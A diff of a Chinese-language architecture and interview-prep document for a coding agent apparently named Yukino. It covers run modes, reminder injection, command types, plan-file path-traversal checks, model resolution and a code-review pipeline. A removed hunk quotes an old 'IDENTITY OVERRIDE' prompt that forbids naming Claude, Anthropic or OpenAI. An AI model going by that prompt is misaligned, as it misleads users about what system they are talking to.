 集成层: `agent.test.ts` (注入 mock LLMClient 驱动完整循环: 工具执行、压缩、恢复、中断) ; `skills.test.ts`、`teams.test.ts` + `file-mailbox.test.ts` (锁、游标、过期) ; `memory.test.ts` + `consolidation.test.ts`; `code-review.test.ts`、`ask-user.test.ts`、`plan-file.test.ts`、`command-loader.test.ts`、`install-skill.test.ts`.
 
-E2E 层: `run-e2e.mjs` / `run-failing.mjs` —— 用 print 模式 (`yukino -p`) 跑真实端到端场景. 可行正是因为 print 与 TUI 共享同一 Agent 核心 (见「四种运行模式复用同一套核心逻辑」) —— headless 模式天然是 E2E 测试的入口点.
+E2E 层: `run-e2e.mjs` / `run-failing.mjs` —— 用 print 模式 (`yukino -p`) 跑真实端到端场景. 可行正是因为 print 与 TUI 共享同一 Agent 核心 (见「六种运行模式复用同一套核心逻辑」) —— headless 模式天然是 E2E 测试的入口点.
 
 测试策略的两个关键决策:
 
@@ -1318,9 +1313,9 @@ SPA fallback: 请求路径找不到文件时回退到 `index.html` (server.ts:80
 
 ---
 
-### 四种运行模式在"依赖组装"上有哪些异同? 为什么说 print/teammate 是"精简版组装"?
+### 四种交互式运行模式在"依赖组装"上有哪些异同? 为什么说 print/teammate 是"精简版组装"?
 
-对比三种非 TUI 模式的依赖注入清单:
+对比三种非 TUI 模式的依赖注入清单 (ACP/A2A 是协议适配宿主, 依赖组装与 remote 同类, 此表不展开) :
 
 | 依赖           | TUI (app.tsx) | remote      | print                                                          | teammate                                                      |
 | -------------- | ------------- | ----------- | -------------------------------------------------------------- | ------------------------------------------------------------- |
@@ -1346,23 +1341,17 @@ SPA fallback: 请求路径找不到文件时回退到 `index.html` (server.ts:80
 
 ---
 
-### `createRemoteAgent()` 里有个"IDENTITY OVERRIDE" system-reminder, 它和系统提示词的 Identity 段是什么关系? 为什么要用追加 reminder 而不是改提示词?
+### remote 模式下, 系统提示词与 system-reminder 各放什么内容? (旧版的"IDENTITY OVERRIDE" reminder 已删除)
 
-`server.ts:419` 在 remote 模式初始化时注入:
+先修正一个历史事实: 旧版 remote `server.ts` 曾在初始化时注入一条 "IDENTITY OVERRIDE" system-reminder (禁止提及 Claude/Anthropic/OpenAI 等品牌名, 被问身份只答 Yukino) . 该机制在当前代码中已删除 —— 全仓检索无 `IDENTITY OVERRIDE` 匹配, 身份约束只来自系统提示词的 Identity 段.
 
-```
-IDENTITY OVERRIDE: You are Yukino. It is absolutely forbidden to mention
-Claude, Anthropic, OpenAI, GPT, or ChatGPT in any response. When asked about
-identity, respond only as Yukino. This is the highest priority instruction.
-```
+现行的分层原则不变: 系统提示词放"不变的、需缓存的", system-reminder 放"可变的、需重申的". remote 模式当前经 reminder 通道注入的内容包括:
 
-与系统提示词的关系: 系统提示词 (PromptBuilder 的 Identity 段) 是会话开始时设定的"底层身份", 而这条 reminder 是以 system-reminder 形式追加的"运行时强化". 品牌名同为 Yukino, 但 remote 面向浏览器用户 (对话会被展示、转发) , 所以需要额外一层身份约束. 两层身份控制并存的原因:
+1. 项目指令与长期记忆: `conv.injectLongTermMemory(instructions, memReminder)` (server.ts:571-572) —— `memoryManager.buildSystemReminder()` 生成 active memories 清单, 与项目指令一起以 reminder 注入; 这些是项目相关内容, 放进系统提示词会破坏跨项目的 prompt cache 前缀.
+2. 计划模式提醒: 重新进入 plan 模式时 `buildPlanModeReentryReminder` 重建提醒 (server.ts:1855-1860) , 退出时 `buildPlanModeExitReminder` (server.ts:1997-1998) —— 这是会话级运行时状态, 不可能进创建 client 时固化的提示词.
+3. MCP 服务器 instructions、hook 通知、团队邮箱消息等经 Agent 循环的 drain 通道, 同样以 reminder 注入.
 
-1. 注入时机不同: 系统提示词由 `buildSystemPrompt()` 在创建 client 时固化; 而身份覆盖是在 `createRemoteAgent()` 的业务流程中按需注入 —— 通过"后注入覆盖"实现 per-mode 定制, 不需要给 builder 加模式参数.
-2. 位置权重不同: LLM 对"对话中最近的用户指令"往往比"系统提示词开头"更敏感, user 角色的 reminder 在多轮对话后仍有较强约束力.
-3. 会话内可重申: system-reminder 机制可在任意时刻再次注入 (如压缩后重新注入长期记忆时) , 系统提示词则请求间不可变 (也是 prompt caching 的要求) .
-
-这体现了提示词工程的分层思想: 系统提示词放"不变的、需缓存的", system-reminder 放"可变的、需重申的". 身份、计划模式提醒、长期记忆、MCP 指令都走 reminder 通道 —— 它们是同一类"运行时策略注入".
+为什么用追加 reminder 而不是改提示词: 系统提示词由 `buildSystemPrompt()` 在创建 client 时固化, 请求间不可变 (prompt caching 要求前缀稳定) ; reminder 是对话内消息, 可在任意时刻注入/重申 (如压缩后重新注入长期记忆) , 且位置靠近当前轮次, 注意力权重更高.
 
 ---
 
@@ -1376,7 +1365,7 @@ identity, respond only as Yukino. This is the highest priority instruction.
 | ------------ | ------------------------- | --------------------------------------- | ------------------------------------------------------- |
 | `local`      | 字符串                    | 直接作为 system 消息展示, 不触网        | `/help`、`/status`                                      |
 | `local_ui`   | 魔法字符串 (如 `"clear"`) | 宿主 UI 在 switch 中分发执行 UI 操作    | `/clear`、`/compact`、`/resume`、`/plan`                |
-| `prompt`     | 提示词文本                | 作为 user 消息注入对话, 触发 Agent 循环 | `/review` ("Review the current uncommitted changes...") |
+| `prompt`     | 提示词文本                | 作为 user 消息注入对话, 触发 Agent 循环 | 用户自定义命令 (`.yukino/commands/*.md`, loader.ts:107) |
 | `skill_fork` | 空串                      | 宿主特判, 派生隔离子代理跑技能          | fork 模式技能                                           |
 
 为什么需要类型维度 —— 因为命令的"副作用域"不同, 宿主必须知道如何处置结果:
@@ -1388,7 +1377,7 @@ identity, respond only as Yukino. This is the highest priority instruction.
 
 用户自定义命令 (`.yukino/commands/*.md`) 一律是 `prompt` 类型 —— 用户能扩展的恰好是"提示词模板"这个最安全也最有用的维度, 而不能注入任意 UI 行为. 类型系统在这里是扩展点的安全边界.
 
-命令注册的其他细节: `CommandRegistry` 双 Map (name→cmd、alias→name) , 注册时撞名抛错, 动态加载用 `hasConflict()` 非抛错检查; `parse()` 只按第一个空格切分 name/args.
+命令注册的其他细节: `CommandRegistry` 内部是单个 Map (name→cmd) , 注册时撞名抛错 (commands.ts:41-43) ; `parse()` 按第一个空白切分 name/args, 且 name 含 `/` 的输入按文件路径处理、不当作命令 (commands.ts:73-84) .
 
 ---
 
@@ -1448,7 +1437,7 @@ return usageCount * Math.max(recency, 0.1);
 2. 每个引用解析为绝对路径, `statSync` 检查: 是文件 且 ≤ `MAX_INLINE_BYTES = 100KB` 才内联 (防御把巨型文件灌进上下文) ;
 3. 命中的文件追加为结构化附录:
 
-```
+```text
 \n\n<file path="src/foo.ts">\n (文件内容) \n</file>
 ```
 
@@ -1471,22 +1460,22 @@ convRef.current.addUserMessage(expanded);
 
 ---
 
-### 斜杠命令自动补全的"五级匹配管道"为什么这样排序? Fuse.js 权重配置说明了什么?
+### 斜杠命令自动补全的"三级匹配管道"为什么这样排序? Fuse.js 权重配置说明了什么?
 
-`input.tsx` 的命令过滤管道 (`useMemo`) 按精确度递减短路:
+`input.tsx` 的命令过滤管道 (`useMemo`) 按精确度递减短路 (input.tsx:312-348) :
 
 1. 精确名匹配 (`/clear` 输全)
-2. 精确别名匹配 (`/c` 命中 clear 的别名)
-3. 前缀名匹配 (`/cle` → clear)
-4. 前缀别名匹配 (`/re` → resume/review 的别名前缀)
-5. Fuse.js 模糊匹配 (`/clar` → clear, 容错)
+2. 前缀名匹配 (`/cle` → clear)
+3. Fuse.js 模糊匹配 (`/clar` → clear, 容错)
 
-排序逻辑: 确定性结果优先于概率性结果. 前四级是字符串运算, 结果唯一可预期; 第五级是评分排序, 可能有多个候选. 用户输入越完整, 命中的级别越靠前 —— 补全体验是"越认真打字, 结果越确定".
+旧版还有"精确别名匹配/前缀别名匹配"两级 (如 `/re` → resume) , 现命令已无别名字段 (input.tsx 里合成条目一律 `aliases: []`) , 别名级随之取消.
+
+排序逻辑: 确定性结果优先于概率性结果. 前两级是字符串运算, 结果唯一可预期; 第三级是评分排序, 可能有多个候选. 用户输入越完整, 命中的级别越靠前 —— 补全体验是"越认真打字, 结果越确定".
 
 Fuse.js 配置 (`keys: [{name:"name",weight:3},{name:"aliases",weight:2},{name:"description",weight:0.5}], threshold:0.4`) :
 
 - name 权重 3: 命令名是用户的心智锚点, 拼写相似度主要体现在名字上;
-- aliases 权重 2: 别名是老用户的快捷输入路径;
+- aliases 权重 2: 权重槽保留 (命令现在没有别名, 数组恒空) , 为未来别名留了召回通道;
 - description 权重 0.5: 描述只作弱召回 (用户模糊记得"那个清理的命令"时 `clean` 能召回 `clear`) , 但权重压低防止"描述里碰巧含关键词"的命令喧宾夺主;
 - threshold 0.4: Fuse 的归一化距离阈值, 0.4 是"允许约 1-2 个字符错误"的松紧度 —— 太松会把无关命令拉进列表, 太紧失去容错意义.
 
@@ -1552,17 +1541,17 @@ export const logger = new Proxy(silentFallback, {
 
 ---
 
-### plan-file 的"形容词-名词-时间戳"命名与路径穿越防护细节是什么?
+### plan-file 的"时间戳 base36 + 随机 hex"命名与路径穿越防护细节是什么?
 
-`plan-file/plan-file.ts`:
+`plan-file/index.ts`:
 
-命名 (`generateSlug()`) : `<adjective>-<noun>-<ts4>.md`, 如 `brave-dragon-a3f2.md`. 形容词 16 个、名词 14 个随机选取, 后缀是 `Date.now().toString(36).slice(-4)`. 为什么不用纯时间戳或序号:
+命名 (`generateSlug()`, `utils/slug.ts:3-7`) : `Date.now().toString(36) + "-" + randomBytes(6).toString("hex")`, 落盘为 `<slug>.md` (plan-file/index.ts:33-34) , 如 `lz3k9x2a-3f8b1c9d2e4a.md`. 旧版的"形容词-名词-时间戳"词表命名已不存在. 为什么用 base36 时间戳 + 随机字节:
 
-- 可读性: `brave-dragon-a3f2` 在 `/rewind` 列表、对话引用中比 `plan-1721433600000` 更易指认;
-- 避免碰撞: 随机词 + 时间戳后缀双重空间, 同秒创建也不撞;
-- 模块级单例 `currentPlanPath`: 一次规划会话复用同一路径, `resetPlanPath()` 在计划获批后清除.
+- 紧凑: base36 把毫秒时间戳压成短串, 6 字节随机数 (12 个 hex 字符) 提供独立熵 —— 同毫秒创建也不撞;
+- 可排序: 时间戳在前, 文件名天然按创建时间大致有序, plans 目录里易指认;
+- 模块级单例 `currentPlanPath`: 一次规划会话复用同一路径, `resetPlanPath()` 在计划获批后清除 (plan-file/index.ts:9, 65-67) .
 
-安全防护 (`isPlanUnderWorkDir()`) : `planExists()` 等操作前校验 `resolve(planPath).startsWith(join(workDir, ".yukino", "plans"))` —— 因为计划文件路径会出现在提示词中 (告诉模型"写到这个路径") , 模型可能幻觉或被注入写出越界路径; 同时该路径与权限系统 Layer 0 联动 (仅当 file_path 含 `.yukino/plans/` 才在 plan 模式放行写入, 见「PermissionChecker 的分层决策管线」) —— 两处校验构成纵深: 权限层放行前缀匹配, 文件层确认真实路径归属.
+安全防护 (`isPlanUnderWorkDir()`, plan-file/index.ts:11-17) : `getOrCreatePlanPath()`/`planExists()` 等操作前校验计划路径真实落在 `{workDir}/.yukino/plans` 内 —— 用 `path.relative(plansDir, resolve(planPath))` 判断: 结果非空、不以 `..` 开头且非绝对路径 (注释说明 `relative()` 与分隔符无关, Windows 上 `resolve()` 产出 `\` 路径, 硬拼 `/` 的 startsWith 永远不会匹配) . 因为计划文件路径会出现在提示词中 (告诉模型"写到这个路径") , 模型可能幻觉或被注入写出越界路径 —— 越界时 `getOrCreatePlanPath()` 记日志并另建新文件、`planExists()` 记日志并返回 false; 同时该路径与权限系统 Layer 0 联动 (仅当 file_path 含 `.yukino/plans/` 才在 plan 模式放行写入, 见「PermissionChecker 的分层决策管线」) —— 两处校验构成纵深: 权限层放行前缀匹配, 文件层确认真实路径归属.
 
 生命周期闭环: 进入 plan 模式 → `getOrCreatePlanPath()` 建空文件 → 模型 (Layer 0 豁免下) 写计划 → `ExitPlanModeTool` → 审批对话框 → 批准执行 → `resetPlanPath()`. 计划文件同时是模型的工作产物与用户的审批对象 —— 一个文件承担两种角色.
 
@@ -1582,21 +1571,15 @@ export const logger = new Proxy(silentFallback, {
 
 ---
 
-### `model-resolver` 的别名机制与 `createModelResolver` 闭包工厂各自解决什么问题?
+### `model-resolver` 的 `createModelResolver` 闭包工厂解决什么问题?
 
-`model-resolver.ts` 两个层次:
+`model-resolver.ts` 现在只有一层 (model-resolver.ts:5-18) . 旧版的 `MODEL_ALIASES` 别名表 (haiku/sonnet/opus → claude 全名) 与 `resolveModelId()` 已从代码中删除, 不再有"语义别名 → 全名"的间接层.
 
-别名表 (静态映射) :
+`createModelResolver(baseConfig, systemPrompt)` 闭包工厂: 返回 `(modelName) => Promise<LLMClient>`, 内部展开 `baseConfig` (保留 api_key/base_url/protocol) 只换 model 字段再 `createClient()`. 解决的问题: 换模型 ≠ 换供应商. 子代理指定不同模型时, 凭证、端点、协议、系统提示词都应继承父级 —— 闭包把这些"不变量"捕获起来, 调用方只关心变量 (模型名) . 这是工厂模式的标准收益: 构造逻辑 (加载配置、选协议、建客户端) 单点收敛, 运行时按需产出. (当前 src 内没有调用方, `spawnSubagent` 直接用同样的展开逻辑内联调 `createClient`, spawn.ts:80-88) .
 
-```ts
-{ haiku: "claude-haiku-4-6", sonnet: "claude-sonnet-4-6", opus: "claude-opus-4-6" }
-```
+model 字段现在直接写具体模型 ID: 内置 explore 角色即 `model: "deepseek-flash"` (definition.ts:40) . 别名档位抽象去掉后, 模型升级需改各引用处, 换来的是名字所见即所得、无隐性别名漂移.
 
-`resolveModelId(name)`: 查表命中返回全名, 未命中原样透传 —— 所以子代理定义里写 `model: "haiku"` (语义稳定, 不随模型版本漂移) 与写完整模型 ID (精确控制) 都合法. 别名是"能力档位"的抽象: explore 代理要的是"最便宜够用的档位"而非某个具体模型 —— 档位映射更新 (新 haiku 发布) 时, 所有引用处自动升级.
-
-`createModelResolver(baseConfig, systemPrompt)` 闭包工厂: 返回 `(shortName) => Promise<LLMClient>`, 内部展开 `baseConfig` (保留 api_key/base_url/protocol) 只换 model 字段再 `createClient()`. 解决的问题: 换模型 ≠ 换供应商. 子代理指定不同模型时, 凭证、端点、协议、系统提示词都应继承父级 —— 闭包把这些"不变量"捕获起来, 调用方只关心变量 (模型名) . 这是工厂模式的标准收益: 构造逻辑 (加载配置、选协议、建客户端) 单点收敛, 运行时按需产出.
-
-联动: `spawnSubagent()` 的模型解析优先级 (调用覆盖 > 定义指定 > 父级) , 指定模型时走 resolver 新建 client, 未指定直接复用父 client (省一次初始化与连接) .
+联动: `spawnSubagent()` 的模型解析优先级 (调用覆盖 > 定义指定 > 父级, spawn.ts:73-75) , 指定模型 (或定义带 systemPromptOverride) 时新建 client, 否则直接复用父 client (省一次初始化与连接) .
 
 ---
 
@@ -1898,7 +1881,7 @@ class PendingDialog<C> {
 }
 ```
 
-要点: ① resolve/reject 句柄外提 (Promise 的"手动档"用法) ; ② 重入防护 (同时只允许一个 pending 对话框 —— Yukino 的 remote 用 Map\<id, resolver> 支持并发多请求) ; ③ 取消路径必须 reject 而非悬挂 (否则 `await` 永不返回, 生成器泄漏) ; ④ 与 AbortController 的联动延伸: 业务方取消时应同时 dismiss 对话框.
+要点: ① resolve/reject 句柄外提 (Promise 的"手动档"用法) ; ② 重入防护 (同时只允许一个 pending 对话框 —— Yukino 的 remote 用 `Map<id, resolver>` 支持并发多请求) ; ③ 取消路径必须 reject 而非悬挂 (否则 `await` 永不返回, 生成器泄漏) ; ④ 与 AbortController 的联动延伸: 业务方取消时应同时 dismiss 对话框.
 
 ---
 
@@ -1990,7 +1973,7 @@ class TokenEstimator {
 
 解析要点:
 
-1. 事件扩展: AgentEvent 增加 `tool_output_delta {toolId, text}`; `Tool.execute` 的 ctx 增加可选 `onOutput?: (chunk: string) => void` 回调 —— 工具内部把子进程 stdout 数据转发出来. Bash 工具需从回调式 `execFile` 换成流式 `spawn` (逐块转发 stdout 的先决条件, 参考「Bash 工具的异步执行权衡」——需要重新评估简单性收益) .
+1. 事件扩展: AgentEvent 增加 `tool_output_delta {toolId, text}`; `Tool.execute` 的 ctx 增加可选 `onOutput?: (chunk: string) => void` 回调 —— 工具内部把子进程 stdout 数据转发出来. Bash 工具已是异步 `spawn`, 但 stdout/stderr 以 fd 直写临时输出文件、不经过 JS (参考「Bash 工具的异步执行权衡」) —— 实时预览需要改造这条写路径: 加 tee/管道旁路或 tail 式轮询输出文件, 需重新评估"输出不经 JS"的简单性收益.
 2. 背压与合帧: 长命令输出可能远超 LLM 流速度 (构建日志 MB/s) , UI 层必须用与 stream_text 相同的 ref 累积 + 定时合帧 (见「流式文本的 50ms 节流」) , 且按工具分桶 (`Map<toolId, buffer>`) .
 3. 渲染预算: 活动工具的预览只保留尾部 N 行 (环形缓冲) , 防止动态区超高触发清屏 (复用「稳定前缀缓存」一节的物理行截断) .
 4. 结果一致性: 流式预览是"过程展示", 最终 `tool_result` 仍是完整 (或 budget 截断) 输出 —— 展示与数据分离, 预览不进对话历史.
@@ -2064,7 +2047,7 @@ class TokenEstimator {
 
 ---
 
-### 设计: 当前 `explore` 子代理用固定便宜模型 (haiku) . 设计一个"按任务复杂度自动选模型档位"的机制.
+### 设计: 当前 `explore` 子代理用固定便宜模型 (deepseek-flash) . 设计一个"按任务复杂度自动选模型档位"的机制.
 
 解析要点:
 
@@ -2072,12 +2055,12 @@ class TokenEstimator {
    - 静态信号: 子代理定义的 `disallowedTools` (只读任务→低档) 、`maxTurns` (大预算→高档) 、提示词长度;
    - 动态信号: 首轮工具调用数 (大量并行读→探索型→低档) 、产生错误的频率;
    - 用户信号: `/model fast|smart` 显式指定偏好.
-2. 路由策略实现: `createModelResolver` (见「model-resolver 的别名机制」) 已是"按名建 client"的工厂, 扩展为 `resolveForTask(def, prompt): ProviderConfig` —— 打分映射到档位 (fast/balanced/strong 三档, 档位映射表可配置, 复用 MODEL_ALIASES 机制) . Router 本身可以是规则引擎 (确定性、零成本) 或一个小模型调用 (灵活但每次子代理多花一次调用 —— 对 explore 这种高频派生不划算) .
+2. 路由策略实现: `createModelResolver` (见「model-resolver 的 createModelResolver 闭包工厂」) 已是"按名建 client"的工厂, 扩展为 `resolveForTask(def, prompt): ProviderConfig` —— 打分映射到档位 (fast/balanced/strong 三档, 档位映射表可配置; 现版本代码已无别名表, 档位映射需作为新配置引入) . Router 本身可以是规则引擎 (确定性、零成本) 或一个小模型调用 (灵活但每次子代理多花一次调用 —— 对 explore 这种高频派生不划算) .
 3. 升级逃生舱: 低档模型执行中连续失败 (如连续 N 轮无进展/工具错误率超阈值) 时, 中断并以高档模型重跑 —— spawn 层捕获失败信号, 把已有对话历史交给强模型续跑 (ConversationManager 可传递, 只是换 client) .
 4. 成本观测: usage 事件已带模型维度 (client 各自统计) , 状态栏分行显示各模型消耗 —— 自动降档的收益可见化.
 5. 护栏: 涉及写操作 (EditFile/WriteFile) 的子代理不允许低档 —— 档位策略与工具能力联动, 不只是文本启发式.
 
-关注点: 静态+动态信号的组合; 升级逃生舱 (降档不是单行道) ; 成本与质量的权衡意识; 复用 resolver/别名机制而非另建体系.
+关注点: 静态+动态信号的组合; 升级逃生舱 (降档不是单行道) ; 成本与质量的权衡意识; 复用 createModelResolver 工厂而非另建体系.
 
 ---
 
@@ -2091,7 +2074,7 @@ class TokenEstimator {
    - 任务成功率: 激活后最终结果是否达成目标 (可用 LLM-as-judge 或断言式校验 —— 如代码类任务跑测试) ;
    - 效率: 激活后的轮数/token 消耗 (好 SOP 应减少试错) ;
    - 上下文成本: 技能正文长度 vs 收益 (inline 技能注入全文, 过长挤占窗口) .
-3. A/B 框架: 同一任务分别在有/无技能下运行 print 模式 (headless 天然适合批量跑, 见「四种运行模式复用同一套核心逻辑」) , 对比指标 —— `stream-json` 输出已有 `num_turns`/`usage`/`tool_calls` 统计, 可直接消费.
+3. A/B 框架: 同一任务分别在有/无技能下运行 print 模式 (headless 天然适合批量跑, 见「六种运行模式复用同一套核心逻辑」) , 对比指标 —— `stream-json` 输出已有 `num_turns`/`usage`/`tool_calls` 统计, 可直接消费.
 4. 回归门禁: 技能修改 (catalog 有 mtime 热重载) 后跑评测集, 指标下降则告警 —— 纳入 CI.
 5. 归因工具: 失败案例回看会话 JSONL (结构化日志, 可 jq 分析) , 定位是激活失败、SOP 歧义还是模型能力问题 —— 三类失败的修复方式不同 (改 description / 改正文 / 换模型) .
 
@@ -2129,7 +2112,7 @@ class TokenEstimator {
 - 记忆提取失败 → 只是少了长期记忆, 主对话无损 → `catch(() => {})` 合理;
 - 日志清理失败 → 磁盘多留几个旧文件 → 合理;
 - MCP 单服务器连接失败 → 其余服务器与全部内置工具仍可用 → warn + 继续合理;
-- 上下文窗口 API 探测失败 → 回落静态表 → 合理 (见「配置系统的多层合并与降级链」) .
+- 项目 `.mcp.json` 解析失败 → log + 返回空列表, 其余服务器与全部内置工具仍可用 → 合理 (见「配置系统的加载策略」) .
 
 必须显式失败的 (核心路径) :
 
@@ -2155,7 +2138,7 @@ class TokenEstimator {
 - `tui/` (Ink→React DOM, 但组件结构可映射: Static→普通列表、50ms 节流/稳定前缀缓存等模式直接搬) ;
 - 平台原语: Bash 工具 (浏览器无子进程 —— 需服务端执行走 WS, 或换 WebContainers) 、文件系统工具 (IndexedDB/OPFS 或服务端代理) 、沙箱 (浏览器本身就是沙箱, 但文件访问能力受限) .
 
-架构印证: 这正是「整体架构」与「四种运行模式复用同一套核心逻辑」设计的回报 —— 领域层零平台依赖 (所有平台原语经 `Tool`/`ToolContext` 接口注入) , UI 层是薄壳. remote 模式 (见「remote 模式的 WebSocket 协议」) 已经演示了"换皮"只需约 1700 行 server + 一个前端. 反过来说, 若当初把 `fs`/`spawn` 直接写进 Agent 核心, 移植就是灾难. 接口隔离的架构决策, 其价值在第二次移植时才完全兑现.
+架构印证: 这正是「整体架构」与「六种运行模式复用同一套核心逻辑」设计的回报 —— 领域层零平台依赖 (所有平台原语经 `Tool`/`ToolContext` 接口注入) , UI 层是薄壳. remote 模式 (见「remote 模式的 WebSocket 协议」) 已经演示了"换皮"只需约 1700 行 server + 一个前端. 反过来说, 若当初把 `fs`/`spawn` 直接写进 Agent 核心, 移植就是灾难. 接口隔离的架构决策, 其价值在第二次移植时才完全兑现.
 
 ---
 
@@ -2199,7 +2182,7 @@ LLM 输出用 Zod 校验是 Agent 应用的特殊要点: 模型的 function call
 基于源码观察的三处 (需要展现"既欣赏设计也能直面问题") :
 
 1. `app.tsx` 的巨石化 (2150 行、数百行命令 switch) : 命令分发逻辑应抽出为"命令处理器注册表" (每命令一个 handler 模块, 类似 remote 的 handleLocalUICommand 但更彻底) , 事件循环的 switch 拆为 handler 映射. 排期: 优先 —— 它是所有 UI 功能的必经之路, 腐烂速度最快; 偿还方式是小步重构 (每次抽一类命令) , 有现有测试兜底.
-2. 权限系统的 YAML 规则与硬编码层级的混合: Layer 2/3 的安全规则 (只读命令表、危险模式正则) 硬编码在 checker.ts 中 —— 安全规则是变化最频繁的知识, 应外置为数据文件 (可热更新、可审计、可被规则引擎统一管理) . 排期: 中期 —— 功能正确但演进成本高; 偿还时附带「权限系统的下一步演进」提到的审计日志.
+2. 权限系统的 YAML 规则与硬编码层级的混合: Layer 2/3 的安全规则 (只读命令表、危险模式正则) 硬编码在 permissions/index.ts 中 —— 安全规则是变化最频繁的知识, 应外置为数据文件 (可热更新、可审计、可被规则引擎统一管理) . 排期: 中期 —— 功能正确但演进成本高; 偿还时附带「权限系统的下一步演进」提到的审计日志.
 3. teammate 与 remote 的能力缺口 (remote 不支持 fork 技能/rewind/worktree, teammate 压缩后不重注入项目指令与长期记忆) : 这些是"显式降级"遗留 —— 诚实但确实是债. 排期: 按用户需求驱动 (YAGNI) , 但应先在共享层抽象"能力矩阵", 避免缺口靠口口相传.
 
 回答结构: 指出问题 (文件+行号级证据) → 为什么是债 (变化点/腐烂速度) → 怎么还 (小步、有测试) → 何时还 (优先级逻辑) —— 展现的是工程管理能力而非抱怨.
@@ -2258,16 +2241,20 @@ LLM 输出用 Zod 校验是 Agent 应用的特殊要点: 模型的 function call
 
 工程启示: 不重新发明 IDE 协议, 直接寄生在已有生态的发现机制 (锁文件 + 环境变量) 上, 用最小代码 (三个文件) 拿到"编辑器选中代码 → 终端 Agent 精确上下文"的高价值体验.
 
-### `/review` 与 `/code-review` 是什么关系? 代码评审子系统如何用团队机制实现多角色评审?
+### `/code-review` 代码评审子系统现在长什么样? (旧版 `/review` 与团队式多角色评审已移除)
 
-两条产品路径:
+先说两个旧版事实的更正: ① 轻量 `/review` 命令 (prompt 类型, 让模型跑 `git status`/`git diff` 后报告 bug) 已不存在 —— `commands.ts` 中没有名为 `review` 的命令; ② 旧版"评审团队 + 评审请求 + 批评者再评估"的团队式评审 (对应旧 `code-review/handler.ts`、`manager.ts`、`session.ts` 结构) 已整体废弃. 当前 `/code-review` 是重构后的"确定性管线 + 隔离子代理评审".
 
-1. `/review` (commands.ts:318) : 轻量路径, 类型为 `prompt` —— handler 返回一段固定提示词, 要求模型跑 `git status`/`git diff` 后以 `file:line` 形式报告正确性 bug、安全问题与可简化点. 无状态、零基础设施.
-2. `/code-review` (commands.ts:304) : 重路径, 类型为 `local`, handler 返回 `code-review:{args}` 前缀字符串; 子命令分发逻辑实现在 `code-review/handler.ts` 的 `handleCodeReviewCommand()` —— create/add/remove/list/status/activate/deactivate 管理评审团队, request/requests/comment/accept/reject/report/approve/reject-request 管理评审请求, critic/critic-summary/add-critic 管理批评者评估 —— 值得注意当前源码中该函数尚无调用方接线, 属于"已实现、待接线"状态.
+入口 (`commands.ts:237-242`) : `/code-review` 类型为 `local_ui` —— 无参数时 handler 返回 `"code-review"`, TUI 打开评审配置对话框 (app.tsx:1680-1682) ; 带参数时返回 `"code-review-usage"` 提示用法 (app.tsx:1683-1691) . 表单收集 focus (需求背景) / from / to / commit / exclude 五个字段 (`form.ts` 的 Zod schema) , 提交后经 `handleCodeReview()` (app.tsx:2720) 调 `runCodeReview()`; remote 浏览器端有等价对话框.
 
-状态模型 (`code-review/manager.ts` + `session.ts`) :
+评审管线 (`runCodeReview()`, runner.ts:122-335) :
 
-- 团队持久化在 `.yukino/code-review-teams.json` (Zod schema: name/members/createdAt/lastActive) , 成员含 `role: reviewer | lead | junior | critic` 与 expertise 数组; `createTeam()` 同时在 TeamManager 里建同名团队并 addMember, 复用团队邮箱做消息路由 (manager.ts:92-109) ;
-- 会话态的 `ReviewSession` (session.ts) 建模评审工作流: ReviewRequest → ReviewComment (带 `CommentResolution: accepted | rejected | pending | resolved`) → CriticAssessment (对评论合理性做 `reasonable | unreasonable | partially-reasonable` 评估) → ReviewSummary/FileFeedback/CommentIssue 分层汇总.
+1. 模式推导: `deriveReviewMode()` (git.ts:240-252) —— commit 优先, 其次 range (from/to) , 默认 workspace; `collectDiffs()` (git.ts:143) 按模式收集 diff (range 用 merge-base..to, commit 用 first-parent show, workspace 覆盖 staged + unstaged + untracked) ;
+2. 确定性选文件 (`selectFiles()`, selection.ts:74-101) : 排除模式、删除文件仅留作上下文不评审、单文件 diff token 上限 (= context_window × PROMPT_TOKEN_RATIO, 保证小窗口 provider 不会被喂进装不下的 diff) —— 纯规则, 无 git 无 LLM;
+3. 语义分组 (`groupDiffs()`, grouping.ts:186-209) : LLM 按主题分组, 失败回退确定性分块 —— 降级而不中止;
+4. 按组并发评审 (`maxConcurrency` 限制的 worker 池) : 每组一个独立 `CommentCollector` (过滤按索引删除, 混组会破坏索引) ; 组内先可选跑 plan 阶段 (变更量超阈值才值得) , 再进入最多 `maxRounds` 轮主循环 —— 每轮跑一个独立子 Agent (自己的对话、工具注册表 ReadFile/Glob/Grep + CodeCommentTool/FileReadDiffTool 与权限作用域, 复用 Agent 循环与自动压缩) , 已确认发现回注下一轮, 整轮无动作则追加 nudge 提示重试 (runner.ts:361-450 附近) ;
+5. 每轮后反思过滤 (`filterComments()`, filter.ts) : 独立 fact-checker LLM 路径复核本轮新发现, 只移除 diff 能**证明**错误的评论, 默认批准 (解析失败/调用失败一律全留) —— 对 LLM 评审意见做元评审, 压低误报;
+6. 评论定位 (runner.ts:528-537) : `resolveComment()` 在自己文件的 diff 内定位行 → 找不到则 `relocateAcrossFiles()` 跨文件搜索 → 再不行 `relocateWithLlm()` LLM 重定位, 逐级降级;
+7. 报告 (`formatReviewReport()`, report.ts) : 模式/文件统计 + critical/high/medium/low 四级严重度计数 + 分组明细.
 
-设计亮点: "评审员评论 → 批评者再评估评论"构成两级质检 (对 LLM 产出的评审意见本身做元评审) , 且角色/团队复用 teams 子系统的邮箱与成员管理 —— 评审子系统只新增了工作流状态机, 通信基础设施零重复.
+设计亮点: 确定性工程 (选文件、分块上限、定位、过滤) 包裹 LLM —— 能算的不猜, LLM 只负责语义判断 (分组、评审、事实核查、重定位兜底) ; "评审子代理产出发现 → 独立 fact-checker 复核发现"构成两级质检, 且过滤默认批准 —— 宁可放过也不误杀, 是评审工具的保守取向.
